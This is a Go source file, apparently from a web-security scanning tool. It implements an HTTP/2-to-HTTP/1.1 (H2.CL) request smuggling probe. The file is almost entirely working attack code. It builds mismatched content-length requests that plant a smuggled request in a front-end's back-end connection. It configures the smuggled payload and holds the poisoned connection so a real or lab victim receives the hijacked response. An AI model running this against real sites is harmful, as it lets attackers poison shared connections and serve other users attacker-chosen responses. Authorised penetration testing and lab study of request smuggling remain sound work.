package probe

import (
	"context"
	"fmt"
	"net"
	"strconv"
	"time"

	rawhttp "github.com/projectdiscovery/rawhttp/client"
)

// H2CLProbe exploits an HTTP/2 front-end that downgrades requests to HTTP/1.1
// while trusting an ambiguous content-length. The HEADERS frame declares a
// short length; the DATA frame carries a complete HTTP/1.1 request after it.
// The back-end reads only the declared bytes, so the remainder is parsed as a
// second request on the same upstream connection. The response to that
// smuggled request is delivered to the victim's next front-end request.
//
// Like every multi-stage probe, it never dials by itself: Runner supplies a
// ConnSource backed by one pinned omnislash session, so both the poison and
// the victim connection share the same exit IP.
type H2CLProbe struct {
	// DeclaredLength is placed in the HTTP/2 content-length header. Zero is the
	// classic form: the back-end reads no body and the first DATA byte becomes
	// the first byte of the smuggled request line.
	DeclaredLength int
	// DeclaredLengths sends multiple content-length headers in order. Some
	// downgrades pick a different value from each duplicate, which is another
	// way to make the two sides disagree about where the body ends.
	DeclaredLengths []int

	// Body, when set, is written verbatim as the DATA frame. Otherwise the
	// structured smuggled_* fields below are rendered into an HTTP/1.1 request.
	Body []byte

	// Method and Path describe the outer HTTP/2 request. Defaults: POST and the
	// target path.
	Method string
	Path   string
	// Authority overrides :authority for the outer request. Defaults to the
	// target host.
	Authority string
	// Scheme overrides :scheme for the outer request. Defaults to https.
	Scheme string

	// SmuggledMethod, SmuggledPath, SmuggledHost and SmuggledBody describe the
	// HTTP/1.1 request carried in the surplus DATA. Defaults: GET, a canary
	// path, the target host, and no body.
	SmuggledMethod string
	SmuggledPath   string
	SmuggledHost   string
	SmuggledBody   string
	// SmuggledPrefix is written before the rendered smuggled request. It lets a
	// front-end that consumes DeclaredLength bytes from DATA be fed a harmless
	// body, with the real request starting exactly at the declared boundary.
	SmuggledPrefix string

	VictimMethod string
	VictimPath   string
	// VictimDelay is the pause between the poison response and the synthetic
	// victim request. A real browser visits on its own schedule; an immediate
	// victim can race the back-end response to the smuggled request.
	VictimDelay time.Duration

	// SameConnectionVictim reuses the poisoned h2 connection for the victim
	// request. Some front-ends bind the desynced upstream socket to the client
	// connection that created it; the default uses a fresh client connection,
	// which tests a shared upstream pool.
	SameConnectionVictim bool
	// SkipVictim leaves the queued smuggled response untouched. Use this when
	// the real victim (for example the lab's browser) must receive it.
	SkipVictim bool
	// HoldAfterPoison keeps the poisoned client connection open for this long
	// after the outer response. The lab browser visits on its own schedule, so
	// closing the client socket immediately can destroy the poisoned upstream
	// connection before the victim's resource request reaches it.
	HoldAfterPoison time.Duration
	// ReadExtraStream reads the poison stream again after its first response.
	// Some front-ends deliver the smuggled response on the original stream id
	// instead of the next client stream.
	ReadExtraStream bool

	// SuccessContains must appear in the victim (or poison) response body. The
	// probe reports evidence regardless, but only this marker yields a verdict.
	SuccessContains string

	Attempts   int
	RetryDelay time.Duration
	Timeout    time.Duration
	Idle       time.Duration
	MaxBody    int64
}

func (p *H2CLProbe) Name() string { return "smuggle/h2-cl" }

// Execute is rejected: the poison and victim must use separate connections.
func (p *H2CLProbe) Execute(ctx context.Context, target Target, conn net.Conn) (*Result, error) {
	return nil, fmt.Errorf("%w: use ExecuteMulti", ErrMultiConn)
}

// ExecuteMulti plants the H2.CL prefix on one connection and sends the victim
// request on a fresh one. A front-end that closes the client socket after each
// response still reuses its back-end socket, which is exactly the state being
// tested.
func (p *H2CLProbe) ExecuteMulti(ctx context.Context, target Target, source ConnSource) (*Result, error) {
	if target.Addr == "" {
		return nil, fmt.Errorf("probe: target address is required")
	}
	attempts := p.Attempts
	if attempts <= 0 {
		attempts = 3
	}
	method := p.Method
	if method == "" {
		method = "POST"
	}
	path := p.Path
	if path == "" {
		path = target.RequestPath()
	}
	authority := p.Authority
	if authority == "" {
		authority = target.HostHeader()
	}
	scheme := p.Scheme
	if scheme == "" {
		scheme = "https"
	}
	victimMethod := p.VictimMethod
	if victimMethod == "" {
		victimMethod = "GET"
	}
	victimPath := p.VictimPath
	if victimPath == "" {
		victimPath = "/"
	}
	marker := p.SuccessContains
	declared := p.DeclaredLengths
	if len(declared) == 0 {
		declared = []int{p.DeclaredLength}
	}
	for _, n := range declared {
		if n < 0 {
			return nil, fmt.Errorf("probe: declared_length must not be negative")
		}
	}
	body := p.Body
	if body == nil {
		var err error
		body, err = p.buildSmuggled(target)
		if err != nil {
			return nil, err
		}
	}
	retryDelay := p.RetryDelay
	if retryDelay < 0 {
		retryDelay = 0
	}
	idle := orDuration(p.Idle, 2*time.Second)

	var e *exec
	first := true
	defer func() {
		if e != nil && e.conn != nil {
			_ = e.conn.Close()
		}
	}()

	// checkVictim turns one victim exchange into evidence. It is shared by the
	// same-connection and fresh-connection topologies so both are judged by the
	// same marker rule.
	checkVictim := func(resp *h2StreamResponse, err error, attempt int, via string) bool {
		if err != nil && !isTimeout(err) {
			e.addFinding(Finding{
				Kind:       "victim_failed",
				Confidence: ConfidenceLow,
				Detail:     fmt.Sprintf("victim request via %s failed on attempt %d: %v", via, attempt, err),
			})
			return false
		}
		if resp == nil {
			return false
		}
		e.res.Responses = append(e.res.Responses, resp.response(len(e.res.Responses)+1))
		if marker != "" && containsMarker(resp.body, marker) {
			e.addFinding(Finding{
				Kind:       "h2_cl_confirmed",
				Confidence: ConfidenceHigh,
				Detail:     fmt.Sprintf("victim response via %s contained %q on attempt %d; the smuggled response was delivered to a different client request", via, marker, attempt),
				Response:   len(e.res.Responses),
			})
			return true
		}
		return false
	}

	for attempt := 1; attempt <= attempts; attempt++ {
		if err := ctx.Err(); err != nil {
			if e == nil {
				return nil, err
			}
			return e.finish(), err
		}

		// Poison stage: one connection, one stream, deliberately mismatched
		// content-length.
		poisonConn, err := source.Dial(ctx)
		if err != nil {
			if e == nil {
				return nil, fmt.Errorf("probe: dial for poison: %w", err)
			}
			return e.finish(), fmt.Errorf("probe: dial for poison (attempt %d): %w", attempt, err)
		}
		if err := requireALPNh2(poisonConn); err != nil {
			_ = poisonConn.Close()
			if e == nil {
				return nil, err
			}
			return e.finish(), err
		}
		if first {
			e = newExec(ctx, p.Name(), target, poisonConn, p.Timeout, defaultMaxHeader, orInt64(p.MaxBody, defaultMaxBody))
			first = false
		} else {
			e.attach(poisonConn)
		}
		tunnel, err := newH2Tunnel(e, authority, orInt64(p.MaxBody, defaultMaxBody))
		if err != nil {
			return e.finish(), err
		}
		poisonResp, err := tunnel.doCL(ctx, method, path, authority, scheme, declared, body, idle)
		if err != nil && !isTimeout(err) {
			return e.finish(), fmt.Errorf("probe: h2-cl poison (attempt %d): %w", attempt, err)
		}
		if poisonResp != nil {
			e.res.Responses = append(e.res.Responses, poisonResp.response(len(e.res.Responses)+1))
			if marker != "" && containsMarker(poisonResp.body, marker) {
				e.addFinding(Finding{
					Kind:       "h2_cl_confirmed",
					Confidence: ConfidenceHigh,
					Detail:     fmt.Sprintf("marker %q appeared in the poison stream response on attempt %d", marker, attempt),
					Response:   len(e.res.Responses),
				})
				return e.finish(), nil
			}
		}
		if p.ReadExtraStream {
			// The front-end created the poison stream with id 1 on this fresh
			// tunnel. A second response there is the smuggled reply mapped back
			// to the original client stream.
			extra, extraErr := tunnel.readAny(ctx, idle)
			if checkVictim(extra, extraErr, attempt, "extra poison stream") {
				_ = poisonConn.Close()
				e.conn = nil
				return e.finish(), nil
			}
		}
		if p.SkipVictim {
			e.addFinding(Finding{
				Kind:       "h2_cl_poison_sent",
				Confidence: ConfidenceLow,
				Detail:     fmt.Sprintf("smuggled request sent on attempt %d; the queued response is left for the real victim", attempt),
			})
			if p.HoldAfterPoison > 0 {
				if err := sleepContext(ctx, p.HoldAfterPoison); err != nil {
					_ = poisonConn.Close()
					e.conn = nil
					return e.finish(), err
				}
			}
			_ = poisonConn.Close()
			e.conn = nil
			if attempt < attempts && retryDelay > 0 {
				if err := sleepContext(ctx, retryDelay); err != nil {
					return e.finish(), err
				}
			}
			continue
		}

		if p.VictimDelay > 0 {
			if err := sleepContext(ctx, p.VictimDelay); err != nil {
				_ = poisonConn.Close()
				e.conn = nil
				return e.finish(), err
			}
		}

		if p.SameConnectionVictim {
			// Same client socket, next h2 stream. This catches front-ends that
			// keep the poisoned upstream socket bound to this connection.
			victimResp, victimErr := tunnel.do(ctx, victimMethod, victimPath, idle)
			if checkVictim(victimResp, victimErr, attempt, "same h2 connection") {
				_ = poisonConn.Close()
				e.conn = nil
				return e.finish(), nil
			}
			// A front-end can map the smuggled reply back to the original
			// poison stream instead of the victim stream. readStream above only
			// accepts the victim's stream id, so drain every stream here.
			extra, extraErr := tunnel.readAny(ctx, idle)
			if checkVictim(extra, extraErr, attempt, "same h2 connection, other stream") {
				_ = poisonConn.Close()
				e.conn = nil
				return e.finish(), nil
			}
			_ = poisonConn.Close()
			e.conn = nil
		} else {
			// Fresh client connection. The desynced prefix lives in the
			// front-end's back-end pool, not in our socket.
			_ = poisonConn.Close()
			e.conn = nil
			victimConn, err := source.Dial(ctx)
			if err != nil {
				return e.finish(), fmt.Errorf("probe: dial for victim (attempt %d): %w", attempt, err)
			}
			if err := requireALPNh2(victimConn); err != nil {
				_ = victimConn.Close()
				return e.finish(), err
			}
			e.attach(victimConn)
			victimTunnel, err := newH2Tunnel(e, authority, orInt64(p.MaxBody, defaultMaxBody))
			if err != nil {
				return e.finish(), err
			}
			victimResp, victimErr := victimTunnel.do(ctx, victimMethod, victimPath, idle)
			if checkVictim(victimResp, victimErr, attempt, "fresh h2 connection") {
				_ = victimConn.Close()
				e.conn = nil
				return e.finish(), nil
			}
			_ = victimConn.Close()
			e.conn = nil
		}

		if attempt < attempts && retryDelay > 0 {
			if err := sleepContext(ctx, retryDelay); err != nil {
				return e.finish(), err
			}
		}
	}

	e.addFinding(Finding{
		Kind:       "h2_cl_unconfirmed",
		Confidence: ConfidenceLow,
		Detail:     fmt.Sprintf("marker %q did not appear after %d attempts", p.SuccessContains, attempts),
	})
	return e.finish(), nil
}

// buildSmuggled renders the surplus DATA bytes as a verbatim HTTP/1.1 request.
func (p *H2CLProbe) buildSmuggled(target Target) ([]byte, error) {
	method := p.SmuggledMethod
	if method == "" {
		method = "GET"
	}
	path := p.SmuggledPath
	if path == "" {
		path = "/omnislash-" + newNonce()
	}
	host := p.SmuggledHost
	if host == "" {
		host = target.HostHeader()
	}
	headers := []rawhttp.Header{{Key: "Host", Value: host}}
	body := []byte(p.SmuggledBody)
	if len(body) > 0 {
		headers = append(headers, rawhttp.Header{Key: "Content-Length", Value: strconv.Itoa(len(body))})
	}
	req, err := render(requestSpec{Method: method, Path: path, Headers: headers, Body: body})
	if err != nil {
		return nil, err
	}
	if p.SmuggledPrefix == "" {
		return req, nil
	}
	return append([]byte(p.SmuggledPrefix), req...), nil
}

func requireALPNh2(conn net.Conn) error {
	state, ok := connectionState(conn)
	if !ok {
		return fmt.Errorf("probe: h2-cl requires a TLS connection")
	}
	if proto := state.NegotiatedProtocol; proto != "h2" {
		return fmt.Errorf("probe: h2-cl requires ALPN h2, got %q", proto)
	}
	return nil
}
